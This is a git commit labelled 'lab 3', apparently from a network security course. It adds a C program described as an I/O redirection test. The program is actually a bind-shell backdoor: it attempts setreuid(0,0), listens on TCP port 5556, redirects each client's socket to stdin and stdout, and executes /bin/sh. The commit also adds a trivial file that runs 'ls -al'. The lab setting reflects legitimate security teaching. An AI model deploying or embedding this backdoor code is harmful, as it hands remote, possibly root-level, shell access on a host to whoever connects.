5a99f61e4e406ae501276b028c450e30516c6506
ExiaHan <hanyang.945@gmail.com>
2015-06-14 20:51:37 +0800

    lab 3

---
+++ NetworkSecurityAndTheSystemRiskAssessment/3/code/ioRedirect.c
@@ -0,0 +1,110 @@
+/*
+ * =====================================================================================
+ *
+ *       Filename:  test.c
+ *
+ *    Description:  For Test IO-Redict by freopen a new file for stdin and
+ *    stdout
+ *
+ *        Version:  1.0
+ *        Created:  2015年06月13日 22时09分11秒
+ *       Revision:  none
+ *       Compiler:  gcc
+ *
+ *         Author:  YOUR NAME (), 
+ *   Organization:  
+ *
+ * =====================================================================================
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+#include <error.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#include <netinet/ether.h>
+#include <arpa/inet.h>
+
+#define STDIN 0
+#define STDOUT 1
+#define PORT 5556
+
+typedef struct sockaddr_in SockAddrIn;
+typedef struct sockaddr SockAddr;
+
+int main(int argc, char **argv)
+{
+    int sockfd, cliSockfd, in, out;
+    int pid, res, addrlen;
+    void *pStdOut;
+    SockAddrIn scSockServer, scSockClient;
+
+    setreuid(0, 0);
+
+    bzero(&scSockServer, sizeof(scSockServer));
+    scSockServer.sin_family = AF_INET;
+    scSockServer.sin_addr.s_addr = htonl(INADDR_ANY);
+    scSockServer.sin_port = htons(PORT);
+
+    addrlen = sizeof(scSockClient);
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (sockfd == -1) {
+        printf("[E]: Can not create socket\n");
+        return -1;
+    }
+
+    if (bind(sockfd, (SockAddr *)(&scSockServer), sizeof(SockAddr)) == -1) {
+        printf("[E]: Error when bind socket [%d] [%s]\n", errno, strerror(errno));
+        return -2;
+    }
+
+    /*************************************
+     * Just For Test I/O Redirect
+     *************************************/
+    /*if(!(iStdin = freopen("./in", "r", stdin))) {
+        printf("[E]: Error When Change Stdin\n");
+        return -1;
+    }
+    if (!(pStdOut = freopen("./out", "w+", stdout))) {
+        printf("[E]: Error When Change Stdout\n");
+        return -2;
+    }
+    */
+    if (listen(sockfd, SOMAXCONN) == -1) {
+        printf("[E]: Error When listen\n");
+        return -3;
+    }
+
+    while (1) {
+        if ((cliSockfd = accept(sockfd, (SockAddr *)(&scSockClient), &addrlen)) == -1) {
+            printf("[E]: Error When accept\n");
+            return -4;
+        }
+    
+        if (!(pid = fork())) {
+            if ((in = dup2(cliSockfd, STDIN)) == -1) {//标准输出重定向到客户机socket
+                printf("[E]: Error When change stdin to socket\n");
+                return -1;
+            }
+
+            if ((out = dup2(cliSockfd, STDOUT) == -1)) {//标准输入重定向到客户机socket
+                printf("[E]: Error When change stdout to socket\n");
+                return -2;
+            }
+    
+            execv("/bin/sh", NULL);
+        }
+        wait(&res);
+    }
+    return 0;
+}
---
+++ NetworkSecurityAndTheSystemRiskAssessment/3/code/test.c
@@ -0,0 +1,25 @@
+/*
+ * =====================================================================================
+ *
+ *       Filename:  test.c
+ *
+ *    Description:  
+ *
+ *        Version:  1.0
+ *        Created:  2015年06月14日 17时44分12秒
+ *       Revision:  none
+ *       Compiler:  gcc
+ *
+ *         Author:  YOUR NAME (), 
+ *   Organization:  
+ *
+ * =====================================================================================
+ */
+#include <stdlib.h>
+#include <stdio.h>
+
+int main()
+{
+    system("ls -al >./out");
+    printf("Bye\n");
+}
